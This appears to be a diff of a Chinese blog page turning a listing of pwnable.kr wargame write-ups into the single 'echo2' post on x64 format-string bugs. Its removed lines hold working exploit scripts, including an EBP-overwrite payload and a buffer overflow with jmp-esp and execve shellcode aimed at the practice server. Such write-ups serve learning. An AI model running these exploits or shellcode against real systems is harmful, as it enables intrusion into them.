@@ -84,15 +84,43 @@
 
 
 
-<meta name="description" content="Dive dive dive into Binary">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Icemakr's Blog">
-<meta property="og:url" content="http://0byjwzsf.me/page/2/index.html">
+<meta name="description" content="Trick对于x64fsb
+
+%1%lx: RDI
+%2%lx: RDX
+%3%lx: RCX
+%4%lx: R8
+%5%lx: R9
+%6$lx: 栈上的第一个QWORD
+
+Conclusion虽然这题看起来很常规，既有fsb也有uaf，但是我的思路又错了QAQ，刚开始没有想到注意到这题也是没有开NX的，思路就歪了，看到fsb首先做的是泄露libc地址，然后想通过uaf实现ret2libc，但是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-rookiss-echo2">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo2/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Dive dive dive into Binary">
+<meta property="og:description" content="Trick对于x64fsb
+
+%1%lx: RDI
+%2%lx: RDX
+%3%lx: RCX
+%4%lx: R8
+%5%lx: R9
+%6$lx: 栈上的第一个QWORD
+
+Conclusion虽然这题看起来很常规，既有fsb也有uaf，但是我的思路又错了QAQ，刚开始没有想到注意到这题也是没有开NX的，思路就歪了，看到fsb首先做的是泄露libc地址，然后想通过uaf实现ret2libc，但是">
+<meta property="og:updated_time" content="2016-08-04T17:21:19.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Icemakr's Blog">
-<meta name="twitter:description" content="Dive dive dive into Binary">
+<meta name="twitter:title" content="pwnable.kr-rookiss-echo2">
+<meta name="twitter:description" content="Trick对于x64fsb
+
+%1%lx: RDI
+%2%lx: RDX
+%3%lx: RCX
+%4%lx: R8
+%5%lx: R9
+%6$lx: 栈上的第一个QWORD
+
+Conclusion虽然这题看起来很常规，既有fsb也有uaf，但是我的思路又错了QAQ，刚开始没有想到注意到这题也是没有开NX的，思路就歪了，看到fsb首先做的是泄露libc地址，然后想通过uaf实现ret2libc，但是">
 
 
 
@@ -113,9 +141,9 @@
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/page/2/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo2/"/>
 
-  <title> Icemakr's Blog </title>
+  <title> pwnable.kr-rookiss-echo2 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -146,9 +174,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -255,9 +281,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -277,379 +303,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016/07/26/pwnable-rookiss-simple-login/" itemprop="url">
-                  pwnable.kr-rookiss-simple-login
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-26T00:00:00+08:00" content="2016-07-26">
-              2016-07-26
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/26/pwnable-rookiss-simple-login/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/26/pwnable-rookiss-simple-login/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><ul>
-<li>输入payload后可以直接通过gdb的<code>searchmem</code>工具查找输入的字符串存放在内存的位置</li>
-</ul>
-<h2 id="Conclusion">Conclusion</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样就可以通过控制<code>EBP</code>的值来转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'AAAA'</span></span><br><span class="line">payload +=  l32(<span class="number">0x08049284</span>)</span><br><span class="line">payload +=  l32(<span class="number">0x0811eb40</span>)  </span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Authenticate :'</span>)</span><br><span class="line">io.writeline(b64encode(payload))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/26/pwnable-rookiss-fsb/" itemprop="url">
-                  pwnable.kr-rookiss-fsb
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-26T00:00:00+08:00" content="2016-07-26">
-              2016-07-26
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/26/pwnable-rookiss-fsb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/26/pwnable-rookiss-fsb/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><ul>
-<li>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</li>
-</ul>
-<h2 id="Exploit">Exploit</h2><p>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。</p>
-<p>等过段时间回来再写一次exp</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo1/" itemprop="url">
-                  pwnable.kr-rookiss-echo1
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-echo1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/25/pwnable-rookiss-echo1/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo2/" itemprop="url">
-                  pwnable.kr-rookiss-echo2
-                </a>
+                pwnable.kr-rookiss-echo2
               
             
           </h1>
@@ -715,9 +369,7 @@
       
 
       
-        
-          
-            <h2 id="Trick">Trick</h2><p>对于x64<strong>fsb</strong></p>
+        <h2 id="Trick">Trick</h2><p>对于x64<strong>fsb</strong></p>
 <ul>
 <li><code>%1%lx</code>: RDI</li>
 <li><code>%2%lx</code>: RDX</li>
@@ -732,16 +384,20 @@
 <h2 id="Referance">Referance</h2><p><a href="https://gist.github.com/ihciah/46a389321db5ab04f31b" target="_blank" rel="external">https://gist.github.com/ihciah/46a389321db5ab04f31b</a></p>
 <p><a href="http://blog.yiz96.com/archives/120" target="_blank" rel="external">http://blog.yiz96.com/archives/120</a></p>
 
-          
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
@@ -749,146 +405,36 @@
       
 
       
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
+              <a href="/2016/07/25/pwnable-rookiss-ascii-easy/" rel="next" title="pwnable.kr-rookiss-ascii-easy">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-ascii-easy
+              </a>
             
-              
-                
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-ascii-easy/" itemprop="url">
-                  pwnable.kr-rookiss-ascii-easy
-                </a>
-              
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
+              <a href="/2016/07/25/pwnable-rookiss-echo1/" rel="prev" title="pwnable.kr-rookiss-echo1">
+                pwnable.kr-rookiss-echo1 <i class="fa fa-chevron-right"></i>
+              </a>
             
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-ascii-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/25/pwnable-rookiss-ascii-easy/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
+          </div>
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h2 id="Trick">Trick</h2><p><code>ulimit -s unlimited</code> 禁用<strong>aslr</strong></p>
-<h2 id="Conclusion">Conclusion</h2><p>没有做出来，不过顺便翻了《Shellcode’s Handerbook》- Chapter 9 学习了下</p>
-<h2 id="Exploit">Exploit</h2><p>下次再补</p>
-<h2 id="Referance">Referance</h2><p><a href="http://blog.yiz96.com/archives/87" target="_blank" rel="external">http://blog.yiz96.com/archives/87</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -896,6 +442,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -915,8 +472,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/author.jpg"
@@ -970,6 +536,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">3.</span> <span class="nav-text">Referance</span></a></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -1073,6 +650,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
@@ -1089,9 +670,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = 'page/2/index.html';
-      var disqus_title = "";
-      var disqus_url = '';
+      var disqus_identifier = '2016/07/25/pwnable-rookiss-echo2/';
+      var disqus_title = "pwnable.kr-rookiss-echo2";
+      var disqus_url = 'http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo2/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
@@ -1102,6 +683,8 @@
       }
 
       run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
       
     </script>
   
